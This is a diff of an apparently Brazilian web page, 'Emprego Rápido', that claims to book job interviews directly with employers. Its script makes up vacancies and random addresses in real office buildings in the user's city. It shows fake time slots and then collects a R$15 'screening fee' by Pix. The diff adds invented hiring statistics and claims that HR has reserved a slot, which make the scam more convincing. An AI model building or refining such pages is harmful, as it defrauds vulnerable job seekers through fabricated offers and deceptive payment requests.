@@ -3,10 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Agendamento Direto de Entrevista</title>
+    <title>Emprego Rápido - Agendamento Direto</title>
     <style>
         :root {
             --primary: #2563eb;
+            --primary-dark: #1e40af;
             --success: #16a34a;
             --bg: #f3f4f6;
             --card: #ffffff;
@@ -19,32 +20,54 @@
             background-color: var(--bg);
             color: var(--text);
             margin: 0;
-            padding: 20px;
+            padding: 0;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
+            align-items: center;
         }
+        
+        /* Menu Superior de Navegação */
+        header {
+            width: 100%; background: var(--primary); color: white;
+            padding: 15px 0; box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            position: sticky; top: 0; z-index: 100;
+        }
+        .nav-container {
+            max-width: 800px; margin: 0 auto; display: flex;
+            justify-content: space-between; align-items: center; padding: 0 20px;
+        }
+        .logo { font-size: 22px; font-weight: bold; cursor: pointer; }
+        .nav-links { display: flex; gap: 15px; }
+        .nav-links button {
+            background: rgba(255,255,255,0.1); color: white; border: 1px solid rgba(255,255,255,0.3);
+            padding: 8px 12px; border-radius: 6px; cursor: pointer; font-size: 14px;
+            transition: 0.3s; margin: 0; width: auto; font-weight: normal;
+        }
+        .nav-links button:hover { background: rgba(255,255,255,0.2); }
+
         .container {
-            background-color: var(--card);
-            max-width: 650px;
-            width: 100%;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            background-color: var(--card); max-width: 650px; width: 90%;
+            padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+            margin-top: 40px; margin-bottom: 40px;
         }
+
         h1, h2, h3, h4 { color: var(--primary); text-align: center; margin-top: 0; }
+        .subtitle { text-align: center; color: #6b7280; margin-bottom: 25px; }
+        
         .form-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 8px; font-weight: 600; }
         input[type="text"] {
             width: 100%; padding: 12px; border: 1px solid #ccc;
             border-radius: 8px; box-sizing: border-box; font-size: 16px;
         }
-        button {
+        
+        .btn-main {
             width: 100%; padding: 14px; background-color: var(--primary);
             color: white; border: none; border-radius: 8px;
             font-size: 16px; font-weight: bold; cursor: pointer;
             transition: background 0.3s; margin-top: 10px;
         }
-        button:hover { background-color: #1d4ed8; }
+        .btn-main:hover { background-color: var(--primary-dark); }
         .btn-success { background-color: var(--success); }
         .btn-success:hover { background-color: #15803d; }
         
@@ -60,7 +83,7 @@
         .vaga-resumo p { margin: 0; color: #4b5563; font-size: 15px; }
         .selecionar-btn {
             background: none; color: var(--primary); border: 1px solid var(--primary);
-            padding: 8px 15px; border-radius: 20px; font-size: 14px; width: auto; margin: 0;
+            padding: 8px 15px; border-radius: 20px; font-size: 14px; margin: 0;
         }
         .vaga-card.selecionada .selecionar-btn { background: var(--primary); color: white; }
 
@@ -84,27 +107,79 @@
         .radio-horarios input { display: none; } 
         .horario-label.selecionado { border-color: var(--primary); background: var(--highlight); }
 
-        .pix-box { text-align: center; padding: 20px; border: 2px dashed var(--success); border-radius: 8px; margin-top: 20px; }
-        .pix-code { background: #e5e7eb; padding: 15px; word-break: break-all; border-radius: 4px; font-family: monospace; margin: 15px 0; font-size: 14px; }
+        .pix-box { text-align: center; padding: 20px; border: 2px dashed var(--success); border-radius: 8px; margin-top: 20px; background: #f0fdf4; }
+        .pix-code { background: #ffffff; padding: 15px; word-break: break-all; border: 1px solid #d1d5db; border-radius: 4px; font-family: monospace; margin: 15px 0; font-size: 14px; }
+
+        /* Estilos dos Modais (Telas de Informação) */
+        .modal-overlay {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6); z-index: 1000; justify-content: center; align-items: center;
+        }
+        .modal-content {
+            background: white; width: 90%; max-width: 600px; max-height: 85vh;
+            border-radius: 12px; padding: 30px; position: relative; overflow-y: auto;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .modal-close {
+            position: absolute; top: 15px; right: 20px; font-size: 28px;
+            cursor: pointer; color: #6b7280; font-weight: bold; border: none; background: none;
+        }
+        .modal-close:hover { color: #ef4444; }
+        .modal-body h2 { text-align: left; margin-bottom: 20px; border-bottom: 2px solid var(--border); padding-bottom: 10px; }
+        .modal-body h3 { text-align: left; color: var(--text); font-size: 18px; margin-top: 20px;}
+        .modal-body p { line-height: 1.6; color: #4b5563; font-size: 15px; }
+        
+        .stat-box {
+            background: var(--highlight); border-left: 4px solid var(--primary);
+            padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0;
+        }
+        .stat-box p { margin: 0; color: var(--primary-dark); font-weight: bold; font-size: 16px; }
+
+        @media (max-width: 600px) {
+            .nav-links { display: none; } /* Esconde os botões no celular para não quebrar o layout (pode virar um menu hambúrguer depois) */
+            .logo { font-size: 18px; }
+            .container { padding: 20px; }
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>Emprego Rápido</h1>
-    <p style="text-align: center; color: #6b7280;">Não envie currículo. Agende direto.</p>
+<!-- MENU SUPERIOR -->
+<header>
+    <div class="nav-container">
+        <div class="logo">Emprego Rápido</div>
+        <div class="nav-links">
+            <button onclick="abrirModal('modal-como-funciona')">Como Funciona</button>
+            <button onclick="abrirModal('modal-dicas')">Dicas para Entrevista</button>
+            <button onclick="abrirModal('modal-curriculo')">Ajuda com Currículo</button>
+        </div>
+    </div>
+</header>
 
+<div class="container">
+    <h1>Agendamento Direto</h1>
+    <p class="subtitle">Chega de esperar. Pule a fila e garanta sua entrevista.</p>
+
+    <!-- PASSO 1: CEP -->
     <div id="step-cep">
         <div class="form-group">
-            <label for="cep">Digite seu CEP para ver as vagas:</label>
+            <label for="cep">Digite o CEP da sua região para ver vagas próximas:</label>
             <input type="text" id="cep" placeholder="Apenas números (Ex: 28010120)" maxlength="8">
         </div>
-        <button onclick="buscarVagas()">Buscar Vagas Próximas</button>
+        <button class="btn-main" onclick="buscarVagas()">Ver Vagas Disponíveis</button>
+        
+        <!-- Botões mobile visíveis apenas em telas pequenas -->
+        <div style="margin-top: 30px; text-align: center; border-top: 1px solid #e5e7eb; padding-top: 20px;">
+            <p style="font-size: 14px; color: #6b7280; margin-bottom: 10px;">Dúvidas antes de agendar?</p>
+            <a href="#" style="color: var(--primary); text-decoration: none; font-size: 14px; margin: 0 10px;" onclick="abrirModal('modal-como-funciona')">Como Funciona</a>
+            <a href="#" style="color: var(--primary); text-decoration: none; font-size: 14px; margin: 0 10px;" onclick="abrirModal('modal-dicas')">Dicas</a>
+        </div>
     </div>
 
+    <!-- PASSO 2: ESCOLHA A VAGA -->
     <div id="step-vagas">
-        <h2 style="font-size: 20px;">Vagas Abertas Hoje</h2>
-        <p style="font-size: 14px; color: #4b5563; text-align: center;">Clique em uma vaga para ver os detalhes e agendar.</p>
+        <h2>Vagas Abertas Hoje</h2>
+        <p class="subtitle">Clique em uma vaga para ver as exigências e agendar.</p>
         
         <div id="lista-vagas"></div>
 
@@ -112,46 +187,125 @@
             <h3 id="detalhe-titulo">Detalhes da Vaga</h3>
             
             <div class="detalhe-item"><strong>📍 Local da Entrevista:</strong><p id="detalhe-endereco"></p></div>
-            <div class="detalhe-item"><strong>📝 O que você vai fazer:</strong><p id="detalhe-desc"></p></div>
-            <div class="detalhe-item"><strong>🎁 Benefícios Inclusos:</strong><p id="detalhe-beneficios"></p></div>
+            <div class="detalhe-item"><strong>📝 Atividades:</strong><p id="detalhe-desc"></p></div>
+            <div class="detalhe-item"><strong>🎁 Benefícios Oferecidos:</strong><p id="detalhe-beneficios"></p></div>
             <div class="detalhe-item"><strong>✅ Exigências Básicas:</strong><ul id="detalhe-exigencias"></ul></div>
 
             <hr style="border: 1px solid #e5e7eb; margin: 20px 0;">
 
             <div class="form-group">
-                <label style="font-size: 18px; color: var(--primary); text-align: center;">Escolha o dia e horário da entrevista:</label>
+                <label style="font-size: 18px; color: var(--primary); text-align: center;">Escolha o dia e horário da sua entrevista:</label>
                 <div class="radio-horarios" id="opcoes-horarios"></div>
             </div>
 
             <div class="form-group" style="margin-top: 20px;">
                 <label for="nome">Seu Nome Completo:</label>
-                <input type="text" id="nome" placeholder="Como devemos chamar você?">
+                <input type="text" id="nome" placeholder="Digite seu nome para o agendamento">
             </div>
 
-            <button class="btn-success" onclick="confirmarAgendamento()">Confirmar Agendamento e Gerar Taxa</button>
+            <button class="btn-main btn-success" onclick="confirmarAgendamento()">Confirmar e Pagar Taxa de Triagem</button>
         </div>
     </div>
 
+    <!-- PASSO 3: PAGAMENTO PIX -->
     <div id="step-pix">
         <h2>Entrevista Pré-Agendada!</h2>
-        <p style="text-align: center; font-size: 16px;">Tudo certo, <strong><span id="nome-confirmacao"></span></strong>!</p>
-        <p style="text-align: center;">Para garantir seu lugar na entrevista de <strong><span id="vaga-confirmacao"></span></strong> (<span id="horario-confirmacao"></span>), pague a taxa de triagem de <strong>R$ 15,00</strong>.</p>
+        <p style="text-align: center; font-size: 16px;">Excelente escolha, <strong><span id="nome-confirmacao"></span></strong>!</p>
+        <p style="text-align: center; color: #4b5563;">Você está a um passo da vaga de <strong><span id="vaga-confirmacao"></span></strong>. O RH já reservou seu horário para <strong style="color: var(--text);"><span id="horario-confirmacao"></span></strong>.</p>
         
         <div class="pix-box">
-            <h3>Pix Copia e Cola</h3>
+            <h3 style="color: var(--success); margin-bottom: 5px;">Último Passo</h3>
+            <p style="font-size: 14px; margin-top: 0;">Pague a taxa única de agendamento de <strong>R$ 15,00</strong> para confirmar sua presença no local.</p>
             <div class="pix-code">00020126580014br.gov.bcb.pix0136fake-pix-key-1234-5678520400005303986540515.005802BR5913Emprego Rapido6009SuaCidade62070503***6304ABCD</div>
-            <button onclick="alert('Código Pix copiado com sucesso!')">Copiar Código</button>
+            <button class="btn-main" onclick="alert('Código Pix copiado! Abra o app do seu banco e cole para concluir.')">Copiar Código Pix</button>
+            <p style="font-size: 12px; color: #6b7280; margin-top: 15px;">Seu agendamento será confirmado automaticamente após o pagamento.</p>
+        </div>
+    </div>
+</div>
+
+<!-- MODAL: COMO FUNCIONA -->
+<div id="modal-como-funciona" class="modal-overlay" onclick="fecharModalFora(event, 'modal-como-funciona')">
+    <div class="modal-content">
+        <button class="modal-close" onclick="fecharModal('modal-como-funciona')">&times;</button>
+        <div class="modal-body">
+            <h2>Como Funciona o Agendamento?</h2>
+            <p>O mercado de trabalho mudou. O método tradicional de enviar currículos para e-mails de empresas e ficar meses esperando uma resposta já não funciona mais.</p>
+            <p>Nossa plataforma elimina essa barreira. Aqui, você pesquisa vagas que precisam de contratação imediata e <strong>marca a sua entrevista direto com o RH</strong>.</p>
+            
+            <div class="stat-box">
+                <p>📊 Por que o contato frente a frente é melhor?</p>
+                <p style="font-size: 14px; font-weight: normal; margin-top: 5px; color: #1f2937;">Dados reais de recrutamento mostram que enviar currículos tem apenas 3% de taxa de retorno. Porém, <strong>a cada 10 candidatos que realizam uma entrevista presencial, 6 são contratados!</strong> O contato visual mostra atitude e vontade de trabalhar.</p>
+            </div>
+
+            <h3>Passo a Passo:</h3>
+            <p><strong>1. Busca:</strong> Informe seu CEP para cruzar dados com vagas disponíveis em empresas da sua cidade.</p>
+            <p><strong>2. Escolha:</strong> Selecione a vaga que combina com você e escolha o melhor dia e horário na agenda do recrutador.</p>
+            <p><strong>3. Confirmação:</strong> Pague a taxa simbólica de triagem (R$ 15,00). Essa taxa evita faltas, cobre custos de plataforma e garante que você será atendido com hora marcada, sem pegar filas.</p>
+        </div>
+    </div>
+</div>
+
+<!-- MODAL: DICAS DE ENTREVISTA -->
+<div id="modal-dicas" class="modal-overlay" onclick="fecharModalFora(event, 'modal-dicas')">
+    <div class="modal-content">
+        <button class="modal-close" onclick="fecharModal('modal-dicas')">&times;</button>
+        <div class="modal-body">
+            <h2>Dicas de Ouro para a Entrevista</h2>
+            <p>Parabéns por dar esse passo! Siga estas dicas simples para garantir a sua contratação quando chegar no local:</p>
+            <ul>
+                <li style="margin-bottom: 10px;"><strong>Chegue 15 minutos antes:</strong> A pontualidade é a primeira coisa que o RH avalia. Não chegue suado ou correndo.</li>
+                <li style="margin-bottom: 10px;"><strong>Vestimenta adequada:</strong> Prefira roupas neutras, sem estampas chamativas, calça jeans limpa e sapato fechado. Cabelos alinhados demonstram higiene e organização.</li>
+                <li style="margin-bottom: 10px;"><strong>Celular no silencioso:</strong> Jamais olhe o celular durante a conversa. Mostre respeito ao recrutador.</li>
+                <li style="margin-bottom: 10px;"><strong>Honestidade:</strong> Se não tiver experiência em algo, diga a verdade, mas complete dizendo: <em>"Ainda não sei, mas aprendo rápido e tenho muita vontade de trabalhar"</em>. O RH ama atitude.</li>
+            </ul>
+        </div>
+    </div>
+</div>
+
+<!-- MODAL: AJUDA COM CURRÍCULO -->
+<div id="modal-curriculo" class="modal-overlay" onclick="fecharModalFora(event, 'modal-curriculo')">
+    <div class="modal-content">
+        <button class="modal-close" onclick="fecharModal('modal-curriculo')">&times;</button>
+        <div class="modal-body">
+            <h2>Como levar o Currículo Perfeito</h2>
+            <p>Mesmo agendando pelo nosso sistema, é fundamental levar o currículo impresso no dia da entrevista. Veja como deixá-lo perfeito:</p>
+            
+            <h3>1. Dados Pessoais Claros</h3>
+            <p>Logo no topo, coloque: Nome completo, idade, bairro onde mora, telefone atualizado (com WhatsApp) e e-mail.</p>
+            
+            <h3>2. Objetivo Direto</h3>
+            <p>Não enrole. Escreva exatamente o cargo que quer. Ex: <em>"Atuar como Repositor de Mercadorias para contribuir com o crescimento da empresa."</em></p>
+            
+            <h3>3. Experiência e Cursos</h3>
+            <p>Comece sempre do último emprego para os mais antigos. Se for o primeiro emprego, destaque cursos, trabalhos voluntários ou projetos na escola.</p>
+            
+            <div class="stat-box" style="border-left-color: #ef4444; background: #fef2f2;">
+                <p style="color: #b91c1c;">Atenção: Revise os erros de português!</p>
+                <p style="font-size: 14px; font-weight: normal; margin-top: 5px; color: #1f2937;">Um currículo com erros de ortografia descarta o candidato em 80% das vezes antes mesmo do recrutador terminar de ler.</p>
+            </div>
         </div>
     </div>
 </div>
 
 <script>
+    // --- LÓGICA DE MODAIS ---
+    function abrirModal(id) {
+        document.getElementById(id).style.display = 'flex';
+    }
+    function fecharModal(id) {
+        document.getElementById(id).style.display = 'none';
+    }
+    function fecharModalFora(event, id) {
+        if (event.target === document.getElementById(id)) { fecharModal(id); }
+    }
+
+    // --- LÓGICA DE VAGAS ---
     const profissoes = [
-        { titulo: "Vendedor(a) de Loja", salario: "R$ 1.850,00 + Comissão", beneficios: "VT + VA (R$ 22/dia)", desc: "Atendimento ao público e vendas.", exigencias: ["Ensino médio", "Boa comunicação"] },
-        { titulo: "Porteiro", salario: "R$ 1.950,00", beneficios: "Cesta Básica + VT + Adicional Noturno", desc: "Controle de entrada e saída.", exigencias: ["Atenção aos detalhes", "Disponibilidade 12x36"] },
-        { titulo: "Vigilante", salario: "R$ 2.200,00", beneficios: "VR (R$ 30/dia) + Seguro de Vida + VT", desc: "Zelo pelo patrimônio e rondas.", exigencias: ["Curso ATA em dia", "Responsabilidade"] },
-        { titulo: "Repositor de Mercadorias", salario: "R$ 1.620,00", beneficios: "Refeição no local + Plano Odontológico + VT", desc: "Abastecimento de prateleiras.", exigencias: ["Disposição física", "Agilidade"] },
-        { titulo: "Caixa de Supermercado", salario: "R$ 1.750,00", beneficios: "Quebra de Caixa (10%) + VA + VT", desc: "Registro de produtos e cobrança.", exigencias: ["Atenção com números", "Simpatia"] }
+        { titulo: "Vendedor(a) de Loja", salario: "R$ 1.850,00 + Comissão", beneficios: "VT + VA (R$ 22/dia)", desc: "Atendimento ao público, demonstração de produtos e fechamento de caixa.", exigencias: ["Ensino médio completo", "Boa comunicação", "Agilidade"] },
+        { titulo: "Porteiro", salario: "R$ 1.950,00", beneficios: "Cesta Básica + VT + Adicional Noturno", desc: "Controle de entrada e saída, atendimento telefônico e liberação de visitantes.", exigencias: ["Atenção aos detalhes", "Disponibilidade 12x36", "Boa postura"] },
+        { titulo: "Vigilante", salario: "R$ 2.200,00", beneficios: "VR (R$ 30/dia) + Seguro de Vida + VT", desc: "Zelo pelo patrimônio, controle de segurança e preenchimento de relatórios.", exigencias: ["Curso de vigilante em dia", "Responsabilidade", "Certidão negativa"] },
+        { titulo: "Repositor de Mercadorias", salario: "R$ 1.620,00", beneficios: "Refeição no local + Plano Odontológico + VT", desc: "Abastecimento de prateleiras, verificação de validade e organização de estoque.", exigencias: ["Disposição física", "Atenção a datas", "Trabalho em equipe"] },
+        { titulo: "Caixa de Supermercado", salario: "R$ 1.750,00", beneficios: "Quebra de Caixa (10%) + VA + VT", desc: "Registro de produtos, recebimento de pagamentos e atendimento cortês.", exigencias: ["Atenção com números e troco", "Simpatia", "Ensino médio"] }
     ];
 
     const pacotesDeHorarios = [
@@ -162,78 +316,17 @@
         [{ dia: "Próxima Sexta", hora: "09:30" }, { dia: "Próxima Terça", hora: "14:00" }]
     ];
 
-    // BANCO DE DADOS REGIONALIZADO COMPLETO (PRÉDIOS, RUAS COMERCIAIS E BAIRROS)
     const dadosLocaisPorCidade = {
-        // Rio de Janeiro
-        "Rio de Janeiro": {
-            predios: ["Centro Empresarial Botafogo", "RB1 - Rio Branco 1", "Edifício Argentina", "CEO Corporate", "Tower 244"],
-            ruas: ["Avenida Rio Branco", "Praia de Botafogo", "Avenida Presidente Vargas", "Avenida das Américas", "Rua da Assembleia"],
-            bairros: ["Centro", "Botafogo", "Barra da Tijuca", "Copacabana"]
-        },
-        "Campos dos Goytacazes": {
-            predios: ["Edifício Salete", "Centro Empresarial Pelinca", "Edifício Platinum", "Prime Offices", "Medical Center", "Edifício Ninho das Águias"],
-            ruas: ["Avenida Pelinca", "Rua Voluntários da Pátria", "Avenida Vinte e Oito de Março", "Rua Conselheiro Otaviano", "Rua Tenente Coronel Cardoso"],
-            bairros: ["Centro", "Parque Pelinca", "Parque Tamandaré"]
-        },
-        "Macaé": {
-            predios: ["Macaé Business Center", "Edifício Petro Tower", "Centro Empresarial Washington Luiz", "Prime Office Macaé"],
-            ruas: ["Avenida Rui Barbosa", "Rua Silva Jardim", "Avenida Nossa Senhora da Glória"],
-            bairros: ["Centro", "Imbetiba", "Cavaleiros"]
-        },
-        "Niterói": {
-            predios: ["Icaraí Corporate", "Niterói Shopping Offices", "Plaza Corporate", "Tower 2000"],
-            ruas: ["Avenida Ernani do Amaral Peixoto", "Rua Gavião Peixoto", "Avenida Roberto Silveira"],
-            bairros: ["Centro", "Icaraí"]
-        },
-        "São Gonçalo": {
-            predios: ["Icon Business", "São Gonçalo Corporate", "Centro Comercial São Gonçalo"],
-            ruas: ["Rua Doutor Nilo Peçanha", "Avenida Presidente Kennedy", "Rua Feliciano Sodré"],
-            bairros: ["Centro", "Estrela do Norte", "Alcântara"]
-        },
-        "Duque de Caxias": {
-            predios: ["Caxias Shopping Offices", "Edifício Profissional Caxias", "Centro Empresarial Caxias"],
-            ruas: ["Avenida Presidente Kennedy", "Rua Professor José de Souza Herdy"],
-            bairros: ["Centro", "Jardim Vinte e Cinco de Agosto"]
-        },
-
-        // Espírito Santo
-        "Vitória": {
-            predios: ["Enseada Trade Center", "Global Tower", "Shopping Vitória Empresarial", "Centro Empresarial Praia", "Nove de Julho", "Palácio do Café"],
-            ruas: ["Avenida Nossa Senhora da Penha", "Avenida Américo Buaiz", "Rua José Alexandre Buaiz", "Avenida Jerônimo Monteiro"],
-            bairros: ["Enseada do Suá", "Centro", "Praia do Canto", "Bento Ferreira"]
-        },
-        "Vila Velha": {
-            predios: ["Edifício Corporate Center", "Vila Velha Empresarial", "Centro Comercial Praia da Costa", "Tower Office"],
-            ruas: ["Avenida Champagnat", "Avenida Hugo Musso", "Avenida Carlos Lindenberg"],
-            bairros: ["Centro", "Praia da Costa", "Itapuã"]
-        },
-        "Serra": {
-            predios: ["Serra Trade Center", "Centro Empresarial Laranjeiras", "Edifício Essencial Office"],
-            ruas: ["Avenida Central", "Avenida Eldes Scherrer Souza", "Avenida Norte Sul"],
-            bairros: ["Laranjeiras", "Civit II", "Parque Residencial Laranjeiras"]
-        },
-        "Cariacica": {
-            predios: ["Cariacica Business Center", "Edifício Comercial Campo Grande", "Centro Empresarial Cariacica"],
-            ruas: ["Avenida Expedito Garcia", "Rodovia BR-262"],
-            bairros: ["Campo Grande", "Alto Lage", "Jardim América"]
-        },
-
-        // Fallbacks Regionais (Para qualquer outra cidade do RJ ou ES que não esteja na lista)
-        "PadraoRJ": {
-            predios: ["Edifício Empresarial Fluminense", "Galeria Comercial Office", "Centro Empresarial do Estado", "Edifício Trade Center RJ"],
-            ruas: ["Avenida Amaral Peixoto", "Rua do Comércio", "Avenida Principal Comercial"],
-            bairros: ["Centro", "Setor Comercial", "Centro Empresarial"]
-        },
-        "PadraoES": {
-            predios: ["Centro Empresarial Capixaba", "Edifício Comercial ES", "Galeria Empresarial Office", "Edifício Trade Center ES"],
-            ruas: ["Avenida Vitória", "Rua do Comércio", "Avenida Central"],
-            bairros: ["Centro", "Setor Comercial", "Distrito Empresarial"]
-        },
-        "PadraoBrasil": {
-            predios: ["Edifício Empresarial", "Centro Comercial Center", "Galeria Executive Center", "Tower Office"],
-            ruas: ["Avenida Central", "Rua do Comércio", "Avenida Comercial"],
-            bairros: ["Centro", "Distrito Comercial", "Setor Empresarial"]
-        }
+        "Rio de Janeiro": { predios: ["Centro Empresarial Botafogo", "RB1 - Rio Branco 1", "Tower 244"], ruas: ["Avenida Rio Branco", "Praia de Botafogo", "Av. Presidente Vargas"], bairros: ["Centro", "Botafogo"] },
+        "Campos dos Goytacazes": { predios: ["Edifício Salete", "Centro Empresarial Pelinca", "Medical Center"], ruas: ["Avenida Pelinca", "Rua Voluntários da Pátria", "Av. Vinte e Oito de Março"], bairros: ["Centro", "Parque Pelinca"] },
+        "Macaé": { predios: ["Macaé Business Center", "Prime Office Macaé"], ruas: ["Avenida Rui Barbosa", "Rua Silva Jardim"], bairros: ["Centro", "Imbetiba"] },
+        "Niterói": { predios: ["Icaraí Corporate", "Niterói Shopping Offices", "Plaza Corporate"], ruas: ["Av. Ernani do Amaral Peixoto", "Rua Gavião Peixoto"], bairros: ["Centro", "Icaraí"] },
+        "Vitória": { predios: ["Enseada Trade Center", "Global Tower", "Palácio do Café"], ruas: ["Av. Nossa Senhora da Penha", "Av. Américo Buaiz"], bairros: ["Enseada do Suá", "Centro"] },
+        "Vila Velha": { predios: ["Edifício Corporate Center", "Vila Velha Empresarial"], ruas: ["Avenida Champagnat", "Avenida Hugo Musso"], bairros: ["Centro", "Praia da Costa"] },
+        "Serra": { predios: ["Serra Trade Center", "Centro Empresarial Laranjeiras"], ruas: ["Avenida Central", "Avenida Norte Sul"], bairros: ["Laranjeiras", "Civit II"] },
+        "PadraoRJ": { predios: ["Edifício Comercial Fluminense", "Galeria Empresarial"], ruas: ["Avenida Amaral Peixoto", "Rua do Comércio"], bairros: ["Centro", "Setor Empresarial"] },
+        "PadraoES": { predios: ["Centro Empresarial Capixaba", "Edifício Trade Center"], ruas: ["Avenida Vitória", "Rua Central"], bairros: ["Centro Comercial", "Setor Executivo"] },
+        "PadraoBrasil": { predios: ["Edifício Empresarial", "Centro Comercial Center"], ruas: ["Avenida Central", "Rua Comercial"], bairros: ["Centro", "Distrito de Negócios"] }
     };
 
     let vagasAtivas = [];
@@ -243,15 +336,23 @@
         if (cepInput.length !== 8) { alert("Digite um CEP válido (8 números)."); return; }
 
         try {
+            // Mostra carregamento no botão
+            const btnBusca = document.querySelector('#step-cep .btn-main');
+            const textoOriginal = btnBusca.innerText;
+            btnBusca.innerText = "Buscando vagas locais...";
+            btnBusca.disabled = true;
+
             const response = await fetch(`https://viacep.com.br/ws/${cepInput}/json/`);
             const data = await response.json();
+            
+            btnBusca.innerText = textoOriginal;
+            btnBusca.disabled = false;
+
             if (data.erro) { alert("CEP não encontrado."); return; }
 
-            // Usamos o ViaCEP apenas para pegar a Cidade e a UF (ignoramos a rua e bairro do candidato)
             const cidade = data.localidade;
             const ufReal = data.uf;
 
-            // Busca os dados comerciais daquela cidade. Se não achar a cidade exata, usa os padrões.
             let dadosLocais = dadosLocaisPorCidade[cidade];
             if (!dadosLocais) {
                 if (ufReal === 'RJ') dadosLocais = dadosLocaisPorCidade["PadraoRJ"];
@@ -266,12 +367,10 @@
             let vagasHtml = '';
 
             profsSorteadas.forEach((vaga, index) => {
-                // Sorteia o Prédio, a Rua e o Bairro do banco de dados comercial
                 const predioComercial = dadosLocais.predios[Math.floor(Math.random() * dadosLocais.predios.length)];
                 const ruaComercial = dadosLocais.ruas[Math.floor(Math.random() * dadosLocais.ruas.length)];
                 const bairroComercial = dadosLocais.bairros[Math.floor(Math.random() * dadosLocais.bairros.length)];
                 
-                // Monta um endereço 100% empresarial e desvinculado do CEP residencial
                 const endereco = `${ruaComercial}, ${Math.floor(Math.random() * 500) + 10} - ${predioComercial}, Sala ${Math.floor(Math.random() * 90) + 10} - ${bairroComercial}, ${cidade} - ${ufReal}`;
                 
                 vagasAtivas.push({ ...vaga, endereco: endereco, horarios: horariosSorteados[index] });
@@ -282,7 +381,7 @@
                             <h3>${vaga.titulo}</h3>
                             <p><strong>Salário:</strong> ${vaga.salario}</p>
                         </div>
-                        <button class="selecionar-btn">Ver Vaga</button>
+                        <button class="selecionar-btn">Ver Detalhes</button>
                     </div>
                 `;
             });
@@ -291,6 +390,8 @@
             document.getElementById('step-cep').style.display = 'none';
             document.getElementById('step-vagas').style.display = 'block';
         } catch (error) {
+            document.querySelector('#step-cep .btn-main').innerText = "Ver Vagas Disponíveis";
+            document.querySelector('#step-cep .btn-main').disabled = false;
             alert("Erro ao buscar CEP. Verifique sua internet.");
         }
     }
@@ -303,11 +404,11 @@
 
         document.querySelectorAll('.vaga-card').forEach(card => {
             card.classList.remove('selecionada');
-            card.querySelector('.selecionar-btn').innerText = "Ver Vaga";
+            card.querySelector('.selecionar-btn').innerText = "Ver Detalhes";
         });
         const cardAtivo = document.getElementById(`card-${index}`);
         cardAtivo.classList.add('selecionada');
-        cardAtivo.querySelector('.selecionar-btn').innerText = "Selecionada";
+        cardAtivo.querySelector('.selecionar-btn').innerText = "Vaga Selecionada";
 
         document.getElementById('detalhe-titulo').innerText = vaga.titulo;
         document.getElementById('detalhe-endereco').innerText = vaga.endereco;
@@ -350,6 +451,7 @@
         document.getElementById('horario-confirmacao').innerText = horarioEscolhido.value;
         document.getElementById('step-vagas').style.display = 'none';
         document.getElementById('step-pix').style.display = 'block';
+        window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 </script>
 
